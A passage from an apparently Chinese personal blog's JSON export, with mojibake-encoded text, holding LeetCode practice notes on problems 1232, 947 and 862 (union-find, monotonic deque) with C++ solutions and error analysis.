è¿™ç§é¢˜ç›®å±…ç„¶WAäº†ä¸€æ¬¡ã€‚ã€‚ã€‚\nä¾é¢˜æ„ï¼Œåˆ¤æ–­ç»™å‡ºçš„æ‰€æœ‰ç‚¹æ˜¯å¦éƒ½åœ¨åŒä¸€ç›´çº¿ä¸Šï¼Œæˆ‘ä»¬åªéœ€è¦æŒ‰ç…§å‰ä¸¤ç‚¹çš„åæ ‡è®¡ç®—æ–œç‡å’Œæˆªè·ï¼Œå¾—åˆ°ç”±å‰ä¸¤ç‚¹ç¡®å®šçš„ç›´çº¿æ–¹ç¨‹ï¼Œå°†åé¢çš„åæ ‡å¥—å…¥æ­¤æ–¹ç¨‹å³å¯ã€‚\nè¿™é¢˜çš„ç‰¹æ®Šæƒ…å†µæœ‰ä¸¤ç§ï¼š\nä¸€å…±åªç»™å‡ºä¸¤ä¸ªç‚¹ã€‚ä¸¤ç‚¹ç¡®å®šä¸€æ¡ç›´çº¿ï¼Œç›´æ¥è¿”å›trueã€‚ æ‰€æœ‰ç‚¹å‚ç›´äºxè½´ã€‚è¿™æ ·çš„ç›´çº¿æ²¡æœ‰æ–œç‡ï¼Œéœ€è¦å•ç‹¬æ‹å‡ºæ¥è®¨è®ºï¼ˆç¬¬ä¸€æ¬¡æäº¤å°±æŒ‚åœ¨è¿™é‡Œäº†ï¼‰ã€‚ ç›´æ¥æ”¾ä»£ç äº†ã€‚\nclass Solution { public: bool checkStraightLine(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; coordinates) { // ax1 + b = y1; ax2 + b = y2 // a(x1 - x2) = y1 - y2 // a = (y1 - y2) / (x1 - x2) // b = y1 - ax1 if (coordinates.size() == 2) return true; bool vertical = false; // å‚ç›´ï¼Œæ— æ–œç‡ float a = 0, b = 0; if (coordinates[0][0] == coordinates[1][0]) vertical = true; else { a = (float)(coordinates[0][1] - coordinates[1][1]) / (coordinates[0][0] - coordinates[1][0]); b = coordinates[0][1] - a * coordinates[0][0]; } if (vertical) { for (int i = 2; i \u0026lt; coordinates.size(); ++i) if (coordinates[i][0] != coordinates[0][0]) return false; } else { for (int i = 2; i \u0026lt; coordinates.size(); ++i) { if (a * coordinates[i][0] + b != coordinates[i][1]) return false; } } return true; } }; ","date":"2021-01-17T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode1232.-%E7%BC%80%E7%82%B9%E6%88%90%E7%BA%BF/","title":"é”™é¢˜æœ¬ | LeetCode1232. ç¼€ç‚¹æˆçº¿"},{"content":"é¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/most-stones-removed-with-same-row-or-column/\né¢˜ç›® n å—çŸ³å¤´æ”¾ç½®åœ¨äºŒç»´å¹³é¢ä¸­çš„ä¸€äº›æ•´æ•°åæ ‡ç‚¹ä¸Šã€‚æ¯ä¸ªåæ ‡ç‚¹ä¸Šæœ€å¤šåªèƒ½æœ‰ä¸€å—çŸ³å¤´ã€‚\nå¦‚æœä¸€å—çŸ³å¤´çš„ åŒè¡Œæˆ–è€…åŒåˆ— ä¸Šæœ‰å…¶ä»–çŸ³å¤´å­˜åœ¨ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç§»é™¤è¿™å—çŸ³å¤´ã€‚\nç»™ä½ ä¸€ä¸ªé•¿åº¦ä¸º n çš„æ•°ç»„ stones ï¼Œå…¶ä¸­ stones[i] = [xi, yi] è¡¨ç¤ºç¬¬ i å—çŸ³å¤´çš„ä½ç½®ï¼Œè¿”å› å¯ä»¥ç§»é™¤çš„çŸ³å­ çš„æœ€å¤§æ•°é‡ã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼š stones = [[0,0],[0,1],[1,0],[1,2],[2,1],[2,2]] è¾“å‡ºï¼š 5 è§£é‡Šï¼š ä¸€ç§ç§»é™¤ 5 å—çŸ³å¤´çš„æ–¹æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š ç§»é™¤çŸ³å¤´ [2,2] ï¼Œå› ä¸ºå®ƒå’Œ [2,1] åŒè¡Œã€‚ ç§»é™¤çŸ³å¤´ [2,1] ï¼Œå› ä¸ºå®ƒå’Œ [0,1] åŒåˆ—ã€‚ ç§»é™¤çŸ³å¤´ [1,2] ï¼Œå› ä¸ºå®ƒå’Œ [1,0] åŒè¡Œã€‚ ç§»é™¤çŸ³å¤´ [1,0] ï¼Œå› ä¸ºå®ƒå’Œ [0,0] åŒåˆ—ã€‚ ç§»é™¤çŸ³å¤´ [0,1] ï¼Œå› ä¸ºå®ƒå’Œ [0,0] åŒè¡Œã€‚ çŸ³å¤´ [0,0] ä¸èƒ½ç§»é™¤ï¼Œå› ä¸ºå®ƒæ²¡æœ‰ä¸å¦ä¸€å—çŸ³å¤´åŒè¡Œ/åˆ—ã€‚ åˆ†æ å…¶å®ä¸çŸ¥é“è¿™é¢˜è¯¥ç®—é”™é¢˜è¿˜æ˜¯éš¾é¢˜ï¼Œæ¯•ç«Ÿå®ƒçš„æ€è·¯æ˜¯ç®€å•çš„ï¼Œä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰æƒ³åˆ°ã€‚\næš‚ä¸”å½’ä¸ºé”™é¢˜ç½¢ã€‚å€Ÿç”±æ­¤é¢˜æ¡å›äº†å¹¶æŸ¥é›†çš„ç›¸å…³çŸ¥è¯†ï¼Œåœ¨å®ç°å¹¶æŸ¥é›†çš„è¿‡ç¨‹ä¸­æœ‰ä¸€äº›ç»†èŠ‚ä¸Šçš„é”™è¯¯å¯¼è‡´äº†ä¸€æ¬¡WAï¼Œæœ¬ç¯‡å°†åŠ ä»¥è®°å½•ã€‚\nåˆ†æï¼š\nç”±é¢˜æ„å¯çŸ¥ï¼Œåœ¨åŒä¸€è¡Œæˆ–åŒä¸€åˆ—ä¸Šçš„çŸ³å¤´å±äºåŒä¸€ä¸ªé›†åˆã€‚æ˜¾ç„¶ï¼Œè¿™æ ·çš„é›†åˆæ°¸è¿œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªåˆ é™¤çš„é¡ºåºï¼Œä½¿å¾—é›†åˆä¸­åªå‰©ä¸‹å”¯ä¸€ä¸€ä¸ªçŸ³å¤´ã€‚\näºæ˜¯é¢˜ç›®è½¬åŒ–ä¸ºäº†ä»¥è¡Œåˆ—ä¸ºä¾æ®çš„å¹¶æŸ¥é›†é—®é¢˜ã€‚å¯¹äºä¸€å—çŸ³å¤´idxï¼Œå…¶åæ ‡ä¸º(x, y)ï¼Œå¦‚æœxè¡Œä¸Šå·²ç»æœ‰äº†å…ˆæ¥çš„çŸ³å¤´root_x[x]ï¼Œé‚£ä¹ˆå°†idxåŠ å…¥å…ˆå‰å°±å­˜åœ¨çš„root_x[x]çš„å¹¶æŸ¥é›†ä¸­ï¼›å¦åˆ™è¡¨ç¤ºidxæ˜¯è¿™ä¸€è¡Œæœ€å…ˆåˆ°è¾¾çš„çŸ³å¤´ï¼Œå…¶åçš„æ‰€æœ‰çŸ³å¤´éƒ½è¦åŠ å…¥idxçš„å¹¶æŸ¥é›†ä¸­ã€‚å¯¹äºyåˆ—æ¥è¯´åŒç†ã€‚\näºæ˜¯å®ç°å¹¶æŸ¥é›†å¦‚ä¸‹ï¼š\nint parent[1010]; // å¹¶æŸ¥é›† // memset(parent, -1, sizeof(parent)); // æˆ–è€… // for (i = 0; i \u0026lt; 1010; i++) parent[i] = i; void join(int parent_idx, int son_idx) { int root_p = find(parent_idx); int root_s = find(son_idx); if (root_p == root_s) return; else parent[root_s] = root_p; } int find(int idx) { if (parent[idx] == -1) return idx; parent[idx] = find(parent[idx]); // è·¯å¾„å‹ç¼© return parent[idx]; } æˆ‘ä»¬éå†æ‰€æœ‰çŸ³å¤´ï¼Œè°å…ˆåˆ°è¾¾æŸä¸€è¡Œï¼Œä¹‹åè¿™ä¸€è¡Œä¸Šçš„çŸ³å¤´éƒ½è¦ä½œä¸ºå®ƒçš„å­èŠ‚ç‚¹ï¼›è°å…ˆåˆ°è¾¾æŸä¸€åˆ—ï¼Œä¹‹åè¿™ä¸€åˆ—ä¸Šçš„çŸ³å¤´éƒ½è¦ä½œä¸ºå®ƒçš„å­èŠ‚ç‚¹ã€‚\nè¿™ä¸€è½®éå†ä¹‹åï¼Œæ‰€æœ‰åŒè¡ŒåŒåˆ—çš„çŸ³å¤´éƒ½å¤„äºåŒä¸€ä¸ªå¹¶æŸ¥é›†ä¸­ï¼›è€Œå…¨å±€ä¸­å¹¶æŸ¥é›†çš„ä¸ªæ•°å°±æ˜¯å‰©ä½™çš„çŸ³å¤´ä¸ªæ•°ã€‚\nclass Solution { public: int parent[1010]; // å¹¶æŸ¥é›† int root_x[10010]; int root_y[10010]; void join(int parent_idx, int son_idx) { int root_p = find(parent_idx); int root_s = find(son_idx); if (root_p == root_s) return; else parent[root_s] = root_p; } int find(int idx) { if (parent[idx] == -1) return idx; parent[idx] = find(parent[idx]); // è·¯å¾„å‹ç¼© return parent[idx]; } int removeStones(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; stones) { int idx, x, y; memset(parent, -1, sizeof(parent)); memset(root_x, -1, sizeof(root_x)); memset(root_y, -1, sizeof(root_y)); for (idx = 0; idx \u0026lt; stones.size(); ++idx) { x = stones[idx][0]; y = stones[idx][1]; if (root_x[x] == -1) { root_x[x] = idx; } else { join(root_x[x], idx); } if (root_y[y] == -1) { root_y[y] = idx; } else { join(root_y[y], idx); } } int cnt = 0; for (idx = 0; idx \u0026lt; stones.size(); ++idx) { if (find(idx) == idx) { ++cnt; cout \u0026lt;\u0026lt; idx \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } } return stones.size() - cnt; } }; é”™è¯¯è®°å½•\nå¹¶æŸ¥é›†ä¸­çš„joinå‡½æ•°ï¼ŒåŸæœ¬çš„å†™æ³•ä¸ºï¼š\nvoid join(int parent_idx, int son_idx) { parent[son_idx] = parent_idx; } è¿™æ ·çš„å†™æ³•æ˜¯é”™è¯¯çš„ï¼Œä¸”éå¸¸ä¹‹ç¦»è°±ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œä¸¤ä¸ªå±äºä¸åŒå¹¶æŸ¥é›†çš„å…ƒç´ çš„åˆå¹¶æ„å‘³ç€ä¸¤ä¸ªå¹¶æŸ¥é›†çš„åˆå¹¶ï¼Œæ˜¾ç„¶ä¸èƒ½å•çº¯åœ°ä¿®æ”¹è¿™ä¸¤ä¸ªå…ƒç´ æœ¬èº«ï¼Œè€Œè¦è€ƒè™‘åˆ°è¿™ä¸¤ä¸ªå¹¶æŸ¥é›†çš„æ ¹èŠ‚ç‚¹ã€‚\nå°±æœ¬é¢˜æ¥è¯´ï¼Œè¿™æ ·çš„å†™æ³•æ— æ³•é€šè¿‡è¿™ä¸ªæµ‹è¯•æ ·ä¾‹ï¼š\n[[0,1],[1,0],[1,1]] å¯¹äºæœ€åä¸€å—çŸ³å¤´(1, 1)ï¼Œç¬¬1è¡Œå·²ç»æœ‰äº†çŸ³å¤´1ï¼Œç¬¬1åˆ—å·²ç»æœ‰äº†çŸ³å¤´0ã€‚æŒ‰ç…§éå†è¿‡ç¨‹çš„é€»è¾‘ï¼š\nfor (idx = 0; idx \u0026lt; stones.size(); ++idx) { x = stones[idx][0]; y = stones[idx][1]; if (root_x[x] == -1) { root_x[x] = idx; } else { join(root_x[x], idx); } if (root_y[y] == -1) { root_y[y] = idx; } else { join(root_y[y], idx); } } æœ€åä¸€å—çŸ³å¤´æœ€ç»ˆå°†åŠ å…¥0å·å¹¶æŸ¥é›†ã€‚ä¸”æ­¤æ—¶å‰©ä½™ç‹¬ç«‹çš„å¹¶æŸ¥é›†æœ‰0å’Œ1ã€‚\nç„¶è€Œï¼Œæœ€åä¸€å—çŸ³å¤´å®é™…ä¸Šæ˜¯0å’Œ1çš„äº¤æ±‡ç‚¹ã€‚æŒ‰ç…§æ­£ç¡®çš„æµç¨‹ï¼Œå®ƒæ ¹æ®xåæ ‡é¦–å…ˆåŠ å…¥1å·å¹¶æŸ¥é›†åï¼Œå†åŠ å…¥0å·å¹¶æŸ¥é›†ï¼Œè¿™æ—¶å°±ä¼šå°†1å·çŸ³å¤´ä¹Ÿå¸¦å…¥0å·å¹¶æŸ¥é›†ï¼Œè¿™ä¹Ÿæ˜¯æœ¬é¢˜ä½¿ç”¨å¹¶æŸ¥é›†æ€è·¯çš„æ­£ç¡®æ€§æ‰€åœ¨ã€‚\næ­£ç¡®çš„åŠæ³•æ˜¯åœ¨åˆå¹¶æ—¶è€ƒè™‘æ ¹èŠ‚ç‚¹çš„ä¿®æ”¹ï¼Œè¯¦è§å‰æ–‡ä»£ç ã€‚\næ­¤å¤–ï¼Œæœ¬é¢˜ä½¿ç”¨çš„å¹¶æŸ¥é›†è¿˜å¯ä»¥è¿›è¡Œä¼˜åŒ–ï¼ŒåŒ…æ‹¬é’ˆå¯¹æœ¬é¢˜çš„å°è£…ï¼ˆå‚è€ƒ[1]ï¼‰ï¼Œå’Œé’ˆå¯¹å¹¶æŸ¥é›†è¿™ä¸€ç»“æ„æœ¬èº«çš„æŒ‰ç§©åˆå¹¶å’Œè·¯å¾„å‹ç¼©ï¼ˆå‚è€ƒ[2]ï¼‰ã€‚\næœ¬é¢˜è¿˜æœ‰åŸºäºå›¾è®ºçš„è§£æ³•ï¼Œä¸åœ¨æœ¬ç¯‡è®¨è®ºèŒƒå›´å†…ã€‚\nå‚è€ƒèµ„æ–™\n[1] å°å®‡.ç®€å•æ€è·¯+ä¼˜åŒ–ï¼ˆè¶…100%ï¼‰[EB/OL].2021-01-15\nhttps://leetcode-cn.com/problems/most-stones-removed-with-same-row-or-column/solution/jian-dan-jie-fa-chao-100-by-mantoufan-k3ne/\n[2] yex.ã€è¯¦è§£ã€‘å¹¶æŸ¥é›†[EB/OL].2021-01-15\nhttps://leetcode-cn.com/problems/most-stones-removed-with-same-row-or-column/solution/tu-jie-bing-cha-ji-by-yexiso-nbcz/\n","date":"2021-01-15T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode947.-%E7%A7%BB%E9%99%A4%E6%9C%80%E5%A4%9A%E7%9A%84%E5%90%8C%E8%A1%8C%E6%88%96%E5%90%8C%E5%88%97%E7%9F%B3%E5%A4%B4/","title":"é”™é¢˜æœ¬ | LeetCode947. ç§»é™¤æœ€å¤šçš„åŒè¡Œæˆ–åŒåˆ—çŸ³å¤´"},{"content":"é¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/shortest-subarray-with-sum-at-least-k/\nè¿™é¢˜çš„æ€è·¯çœŸæ˜¯å¼¯å¼¯ç»•ç»•ï¼Œçœ‹äº†å¾ˆå¤šä»½é¢˜è§£ï¼Œæœ€åè¿˜æ˜¯æˆ‘BUPTå­¦é•¿çš„ä¸€é€šæ¨¡æ‹Ÿè®©æˆ‘æ‚Ÿé“äº†[1]ã€‚\nåˆ†æï¼š\né¢˜ç›®è¦æ±‚è¿”å›æ•°ç»„Açš„æœ€çŸ­çš„éç©ºè¿ç»­å­æ•°ç»„çš„é•¿åº¦ï¼Œè¯¥å­æ•°ç»„çš„å’Œè‡³å°‘ä¸ºKã€‚\næœ€å¼€å§‹æƒ³åˆ°çš„æ˜¯æš´åŠ›ã€‚å‡è®¾æ•°ç»„é•¿åº¦ä¸ºnï¼Œæˆ‘ä»¬åˆ†åˆ«æ±‚å‡ºé•¿åº¦ä¸º1ã€2ã€\u0026hellip;ã€nçš„å­æ•°ç»„çš„æœ€å¤§å’Œï¼Œå°†ä»–ä»¬æŒ‰é¡ºåºå’ŒKæ¯”è¾ƒï¼Œç¬¬ä¸€ä¸ªæ¯”Kå¤§çš„é•¿åº¦å°±æ˜¯ç­”æ¡ˆã€‚è¿™æ ·çš„åšæ³•æ—¶é—´å¤æ‚åº¦æ˜¯O(n2)ï¼Œæœ‰ç‚¹å¤æ‚ã€‚\nä¹‹åå°±æ²¡æœ‰æƒ³æ³•äº†ã€‚è·Ÿæ³“æ³“æŒ£æ‰äº†åŠå¤©ï¼Œè¿˜æ˜¯åªèƒ½å»çœ‹é¢˜è§£ã€‚\nä¸å¾—ä¸è¯´ï¼Œå®˜æ–¹é¢˜è§£çœŸæ˜¯ä¸è®²äººè¯[2]ï¼Œä¸åˆ°40è¡Œä»£ç çš„æ€è·¯ï¼Œç¡¬æ˜¯èƒ½è¢«è¯´æˆé¬¼éƒ½çœ‹ä¸æ‡‚çš„æ ·å­ã€‚\né¦–å…ˆï¼Œä¸ºäº†æ–¹ä¾¿æ±‚ä»»æ„ä¸€æ®µè¿ç»­å­æ•°ç»„çš„å’Œï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨å‰ç¼€å’Œæ•°ç»„prefix_sumã€‚åœ¨è¿™ä¸ªé¢˜ç›®ä¸­ï¼Œprefix_sum[i]è¡¨ç¤ºçš„æ˜¯ä»A[0]åˆ°A[i - 1]çš„å‰ç¼€å’Œï¼Œæ³¨æ„æ˜¯A[i - 1]ï¼Œä½œç”¨åé¢ä¼šè®²ã€‚æ€»ä¹‹ï¼Œæ±‚å‰ç¼€å’Œçš„åŠæ³•æ˜¯å¾ˆå¸¸è§„çš„ã€‚\næˆ‘ä»¬çŸ¥é“ï¼Œæ±‚å¾—äº†å‰ç¼€å’Œæ•°ç»„ä¹‹åï¼Œå¯¹äºä¸¤ä¸ªä¸‹æ ‡xã€yï¼ˆè®¾y\u0026gt;xï¼‰ï¼Œprefix_sum[y] - prefix_sum[x]è¡¨ç¤ºçš„å°±æ˜¯ä»A[x + 1]åˆ°A[y]è¿™æ®µå­æ•°ç»„çš„å’Œã€‚é‚£ä¹ˆï¼Œé—®é¢˜å°±è½¬åŒ–ä¸ºäº†é’ˆå¯¹prefix_sumæ•°ç»„ï¼Œæ±‚ä¸€å¯¹xå’Œyï¼Œæ»¡è¶³prefix_sum[y] - prefix_sum[x] \u0026gt;= Kï¼Œä¸”y - xæœ€å°ã€‚\næœ´ç´ çš„æ€æƒ³æ˜¯éå†æ¯ä¸€å¯¹yå’Œxï¼Œè¿™æ ·çš„å¤æ‚åº¦è¿˜æ˜¯O(n2)ï¼Œæ˜¾ç„¶éœ€è¦ç”¨æŸç§æ›´å·§å¦™çš„åŠæ³•è®©æˆ‘ä»¬æ‘†è„±ä¸¤é‡å¾ªç¯ã€‚\näºæ˜¯å¼•å‡ºå®˜æ–¹é¢˜è§£ä¸­çš„ç¬¬ä¸€æ¡æ€§è´¨ï¼š\nå¯¹äºprefix_sumæ•°ç»„ï¼Œå‡è®¾æœ‰ä¸‹æ ‡**a \u0026gt; b**ï¼Œä¸”prefix_sum[a] \u0026lt;= prefix_sum[b]ï¼Œé‚£ä¹ˆå¯¹äºå®ƒä»¬åé¢çš„æŸä¸ªä¸‹æ ‡yæ¥è¯´ï¼Œåªéœ€è¦è€ƒè™‘a ~ yè¿™ä¸€æ®µæ˜¯å¦æ»¡è¶³æ¡ä»¶ï¼Œè€Œä¸å†éœ€è¦è€ƒè™‘b ~ yè¿™ä¸€æ®µäº†ã€‚è¿™æ˜¯å› ä¸ºï¼Œprefix_sum[y] - prefix_sum[a] \u0026gt;= prefix_sum[y] - prefix_sum[b]ï¼Œè€Œä¸”y - a \u0026lt; y - bï¼Œå¦‚æœb ~ yè¿™ä¸€æ®µèƒ½æ»¡è¶³æ¡ä»¶ï¼Œé‚£ä¹ˆa ~ yè¿™ä¸€æ®µä¹Ÿä¸€å®šèƒ½æ»¡è¶³æ¡ä»¶ï¼Œè€Œä¸”è¿™æ®µå­æ•°ç»„çš„é•¿åº¦æ›´å°ã€‚ å¦‚æœæˆ‘æ²¡æœ‰è®²æ¸…æ¥šï¼Œä¸å¦¨çœ‹çœ‹å‚è€ƒ[1]ä¸­çš„æ¨¡æ‹Ÿå¤§æ³•ï¼š\næœ¬æ¡æ€§è´¨çš„æ¨¡æ‹Ÿ æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªåŒç«¯é˜Ÿåˆ—dequeæ¥åˆ©ç”¨è¿™ä¸ªæ€§è´¨ã€‚è®©ä¸‹æ ‡ä»å‰å¾€åèµ°ï¼Œä¿æŒdequeä¸­ä¿å­˜çš„ä¸‹æ ‡x0ã€x1ã€\u0026hellip;å§‹ç»ˆæ»¡è¶³prefix_sum[x0] \u0026lt; prefix_sum[x1] \u0026lt; ...ï¼›æ³¨æ„ï¼Œç”±äºä¸‹æ ‡æ˜¯ä»å‰å¾€åèµ°çš„ï¼Œå½“å‡ºç°äº†æŸä¸ªprefix_sum[x_m] \u0026lt; prefix_sum[deque.back()]çš„æ—¶å€™ï¼Œè¯´æ˜å¯¹äºä¹‹åçš„ä¸‹æ ‡yæ¥è¯´ï¼Œx_mæ˜¯æ›´ä¸ºåˆé€‚çš„é€‰æ‹©ï¼Œä¹Ÿå› æ­¤å¯ä»¥ç›´æ¥å°†é˜Ÿå°¾çš„å…ƒç´ å‰”é™¤ã€‚\nä½¿ç”¨ä¸‹é¢çš„ä»£ç æ¥è¿›è¡Œå®ç°ï¼Œæ³¨æ„dequeçš„åˆå§‹å…ƒç´ 0ã€‚\n// deque\u0026lt;int\u0026gt; monoq;\t// å˜é‡åä¸å®˜æ–¹é¢˜è§£ä¿æŒä¸€è‡´ monoq.push_back(0); // æ”¾å…¥ä¸€ä¸ª0 for (i = 1; i \u0026lt;= A.size(); ++i) // ä¸‹æ ‡ä»å‰å¾€åèµ° { while (!monoq.empty() \u0026amp;\u0026amp; prefix_sum[monoq.back()] \u0026gt;= prefix_sum[i]) { monoq.pop_back(); // å½“å‰è¿™ä¸ªiæ»¡è¶³æ€§è´¨ä¸€ï¼Œä½¿å¾—åç»­çš„yåªéœ€è¦è€ƒè™‘ä¸‹æ ‡i } ... } å®ç°äº†æ€§è´¨ä¸€ï¼Œéœ€è¦å¼•å‡ºæ€§è´¨äºŒï¼š\nå¯¹äºä¸€ä¸ªå›ºå®šçš„ä¸‹æ ‡xæ¥è¯´ï¼Œç¬¬ä¸€æ¬¡é‡è§æŸä¸ªyæ»¡è¶³prefix_sum[y] - prefix_sum[x] \u0026gt;= Kä¹‹åï¼Œå…¶åæ›´å¤§çš„ä¸‹æ ‡y_biggerå°±ä¸å¿…å†è€ƒè™‘xäº†ã€‚è¿™å¾ˆåˆä¹ç›´è§‰ï¼Œå› ä¸ºæˆ‘ä»¬è¦æ±‚çš„æ˜¯æœ€å°çš„y - xã€‚ æˆ‘ä»¬çš„ä¸‹æ ‡ä»å‰å¾€åèµ°çš„æ—¶å€™ï¼Œå½“å‰ä¸‹æ ‡æ—¢æ˜¯xï¼Œä¹Ÿæ˜¯yã€‚æ›´ç¡®åˆ‡åœ°è¯´ï¼Œè®¾å½“å‰ä¸‹æ ‡ä¸ºiï¼Œå®ƒå‘å‰éœ€è¦çœ‹èƒ½å¦æ»¡è¶³prefix_sum[i] - prefix_sum[x] \u0026gt;= Kï¼›å‘åéœ€è¦è€ƒè™‘è‡ªå·±ä½œä¸ºåŒºé—´èµ·ç‚¹çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯ä½œä¸ºä¸€ä¸ªxï¼Œæ·˜æ±°æ‰é˜Ÿåˆ—ä¸­ç°æœ‰çš„æ»¡è¶³æ€§è´¨ä¸€çš„é‚£äº›å…ƒç´ ã€‚\nä¸Šé¢çš„ä»£ç å·²ç»æˆåŠŸåˆ©ç”¨äº†æ€§è´¨ä¸€ï¼Œç°åœ¨åªéœ€è¦å†ä»é˜Ÿé¦–å»æ‰¾æ»¡è¶³æ€§è´¨äºŒçš„å…ƒç´ å³å¯ï¼š\nfor (i = 1; i \u0026lt;= A.size(); ++i) { /* æ€§è´¨ä¸€ã€å½“å‰ä¸‹æ ‡ä½œä¸ºåŒºé—´èµ·ç‚¹çš„æƒ…å†µ */ while (!monoq.empty() \u0026amp;\u0026amp; prefix_sum[monoq.back()] \u0026gt;= prefix_sum[i]) { monoq.pop_back(); } /* æ€§è´¨äºŒã€å½“å‰ä¸‹æ ‡ä½œä¸ºåŒºé—´ç»ˆç‚¹çš„æƒ…å†µ */ while (!monoq.empty() \u0026amp;\u0026amp; prefix_sum[i] - prefix_sum[monoq.front()] \u0026gt;= K) { ans = min(ans, i - monoq.front()); monoq.pop_front(); } /* å½“å‰ä¸‹æ ‡æ”¾å…¥é˜Ÿåˆ—ä¸­ï¼Œä½œä¸ºåŒºé—´èµ·ç‚¹ */ monoq.push_back(i); } ACä»£ç ï¼š\nclass Solution { public: int shortestSubarray(vector\u0026lt;int\u0026gt;\u0026amp; A, int K) { int prefix_sum[50010]; // å‰ç¼€å’Œæ•°ç»„ deque\u0026lt;int\u0026gt; monoq; // å•è°ƒé˜Ÿåˆ— int i; // å¾ªç¯å˜é‡ int ans = A.size() + 1; // æœ€ç»ˆç­”æ¡ˆï¼Œåˆå§‹å€¼å¤§äºæ•°ç»„é•¿åº¦ï¼Œæ˜¯ä¸ªè¿æ³•æ•°å€¼ /* å¾ªç¯ä¸€éæ±‚å¾—å‰ç¼€å’Œ */ prefix_sum[0] = 0; // !IMPORTANT for (i = 1; i \u0026lt;= A.size(); ++i) // prefix_sum[i]ä¸ºA[0]åˆ°A[i - 1]çš„å‰ç¼€å’Œ { prefix_sum[i] = prefix_sum[i - 1] + A[i - 1]; } /* å†å¾ªç¯ä¸€éæ±‚å¾—æœ€çŸ­å­æ•°ç»„çš„é•¿åº¦ */ monoq.push_back(0); // æ”¾å…¥ä¸€ä¸ª0 for (i = 1; i \u0026lt;= A.size(); ++i) { /* æ€§è´¨ä¸€ã€å½“å‰ä¸‹æ ‡ä½œä¸ºåŒºé—´èµ·ç‚¹çš„æƒ…å†µ */ while (!monoq.empty() \u0026amp;\u0026amp; prefix_sum[monoq.back()] \u0026gt;= prefix_sum[i]) { monoq.pop_back(); } /* æ€§è´¨äºŒã€å½“å‰ä¸‹æ ‡ä½œä¸ºåŒºé—´ç»ˆç‚¹çš„æƒ…å†µ */ while (!monoq.empty() \u0026amp;\u0026amp; prefix_sum[i] - prefix_sum[monoq.front()] \u0026gt;= K) { ans = min(ans, i - monoq.front()); monoq.pop_front(); } /* å½“å‰ä¸‹æ ‡æ”¾å…¥é˜Ÿåˆ—ä¸­ï¼Œä½œä¸ºåŒºé—´èµ·ç‚¹ */ monoq.push_back(i); } return ans == A.size() + 1 ? -1 : ans; } }; ä¸€äº›ç»†èŠ‚\nåœ¨ä¹‹å‰çš„åˆ†æä¸­æˆ‘ä»¬æåˆ°è¿‡ï¼Œåœ¨è¿™ä¸ªé¢˜ç›®ä¸­ï¼Œprefix_sum[i]è¡¨ç¤ºçš„æ˜¯ä»A[0]åˆ°A[i - 1]çš„å‰ç¼€å’Œã€‚è¿™é‡Œçš„å‰ç¼€å’Œæ•°ç»„çš„è¡¨ç¤ºæ–¹æ³•ä¸»è¦æ˜¯ä¸ºäº†æ»¡è¶³åŒºé—´é•¿åº¦ä¸ºA.size()æ—¶çš„æƒ…å†µã€‚æˆ‘ä»¬çš„monoqéœ€è¦æœ‰ä¸ªåˆå§‹å…ƒç´ 0ï¼Œè¿™ä½¿å¾—prefix_sum[0]ä¹Ÿå—åˆ°è€ƒè™‘ã€‚å½“ç­”æ¡ˆåŒºé—´é•¿åº¦ä¸ºA.size()çš„æ—¶å€™ï¼Œå¦‚æ ·ä¾‹3ï¼š\nè¾“å…¥ï¼šA = [2,-1,2], K = 3 è¾“å‡ºï¼š3 å¦‚æœæ²¡æœ‰ä¸€ä¸ªprefix_sum[monoq.front()] == 0ï¼Œå‰ç¼€å’Œprefix_sum[3]ä¼šç›´æ¥å‡æ‰prefix_sum[1]ï¼Œé€ æˆè¾“å‡ºä¸º-1ã€‚\nå‚è€ƒæ–‡ç« \n[1] ç‹ç›.Leetcode 862 Shortest Subarray with Sum at Least K[EB/OL].2018-07-02\nhttps://buptwc.github.io/2018/07/02/Leetcode-862-Shortest-Subarray-with-Sum-at-Least-K/\n[2] LeetCode.å’Œè‡³å°‘ä¸º K çš„æœ€çŸ­å­æ•°ç»„[EB/OL].2019-08-13\nhttps://leetcode-cn.com/problems/shortest-subarray-with-sum-at-least-k/solution/he-zhi-shao-wei-k-de-zui-duan-zi-shu-zu-by-leetcod/\n","date":"2021-01-13T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode862.-%E5%92%8C%E8%87%B3%E5%B0%91%E4%B8%BA-k-%E7%9A%84%E6%9C%80%E7%9F%AD%E5%AD%90%E6%95%B0%E7%BB%84/","title":"éš¾é¢˜æœ¬ | LeetCode862. å’Œè‡³å°‘ä¸º K çš„æœ€çŸ­å­æ•°ç»„"},{"content":"é¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/verifying-an-alien-dictionary/\né¢˜ç›®åˆ†æï¼šç”±é¢˜ç›®ç»™å®šå­—ç¬¦çš„å¤§å°ç­‰çº§ï¼Œä¾ç…§æ­¤ç­‰çº§æ¯”è¾ƒå­—ç¬¦ä¸²å¤§å°ã€‚\nè§£é¢˜æ€è·¯ï¼šå®šä¹‰ä¸€ä¸ªæ•°ç»„order_rank[26]ï¼Œç»™å®šæŸä¸ªå­—ç¬¦c, order_rank['a' - c]è¡¨ç¤ºè¯¥å­—ç¬¦åœ¨orderä¸­çš„ä½ç½®ã€‚\né”™è¯¯è®°å½•ï¼šç¨‹åºç¬¬32è¡Œï¼ŒåŸæœ¬å†™ä½œï¼šwhile (words1[idx] == words2[idx])ï¼Œè¿™æ ·çš„å†™æ³•æ— 